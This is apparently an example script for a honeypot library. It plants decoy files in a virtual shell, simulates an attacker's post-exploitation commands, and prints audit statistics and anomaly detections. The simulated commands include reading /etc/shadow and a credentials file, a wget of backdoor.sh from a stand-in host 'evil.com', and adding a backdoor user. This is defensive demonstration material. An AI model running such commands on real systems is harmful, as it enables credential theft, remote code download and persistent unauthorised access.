/**
 * Security honeypot with threat detection
 *
 * Real-world scenario: Deploy an SSH honeypot that logs all attacker
 * behavior, detects brute-force attempts, and generates audit reports.
 */
import { HoneyPot, SshClient, VirtualShell } from "../src";

// ── Deploy honeypot ───────────────────────────────────────────────
console.log("--- Deploy honeypot ---");

const shell = new VirtualShell("honeypot");
await shell.ensureInitialized();
const vfs = shell.getVfs()!;
const users = shell.getUsers()!;

vfs.writeFile("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash");
vfs.writeFile("/etc/shadow", "root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::");
vfs.writeFile("/home/admin/.ssh/authorized_keys", "ssh-rsa AAAA... decoy-key");
vfs.writeFile("/var/log/auth.log", "Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22");
vfs.writeFile("/opt/credentials.txt", "db_password=S3cretP@ss\napi_key=sk-fake-12345");
vfs.writeFile("/root/.bash_history", "cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh");

const honeypot = new HoneyPot(10000);
honeypot.attach(shell, vfs, users);

console.log("Honeypot configuration:");
console.log("  - Hostname: honeypot");
console.log("  - Decoy files planted: 6");
console.log("  - Audit logging: enabled");
console.log("  - Anomaly detection: enabled");

// ── Simulate attacker activity ────────────────────────────────────
console.log("\n--- Simulate attacker activity ---");

const attacker = new SshClient(shell, "root");

const commands = [
	"cat /etc/passwd",
	"cat /etc/shadow",
	"cat /opt/credentials.txt",
	"cat /root/.bash_history",
	"ls -la /home/admin/.ssh/",
	"wget http://evil.com/backdoor.sh",
	"chmod +x backdoor.sh",
	"useradd backdoor",
	"echo 'backdoor:pass' | chpasswd",
];

console.log("  Post-exploitation commands:");
for (const cmd of commands) {
	const result = await attacker.exec(cmd);
	console.log(`    $ ${cmd} -> exit ${result.exitCode}`);
}

// ── Audit report ──────────────────────────────────────────────────
console.log("\n--- Audit report ---");
console.log("=".repeat(60));

const stats = honeypot.getStats();
console.log("\n  Activity stats:");
console.log(`    Commands executed: ${stats.commands}`);
console.log(`    File reads: ${stats.fileReads}`);
console.log(`    File writes: ${stats.fileWrites}`);
console.log(`    Session starts: ${stats.sessionStarts}`);
console.log(`    Auth attempts: ${stats.authAttempts}`);
console.log(`    Auth lockouts: ${stats.authLockouts}`);

const auditLog = honeypot.getAuditLog();
console.log(`\n  Total audit entries: ${auditLog.length}`);

console.log("\n  Recent events:");
const recent = honeypot.getRecent(10);
for (const entry of recent) {
	console.log(`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`);
}

const anomalies = honeypot.detectAnomalies();
console.log("\n  Anomaly Detection:");
if (anomalies.length === 0) {
	console.log("    No anomalies detected");
} else {
	for (const a of anomalies) {
		console.log(`    [${a.severity}] ${a.type}: ${a.message}`);
	}
}

console.log("\n--- Honeypot audit complete ---");
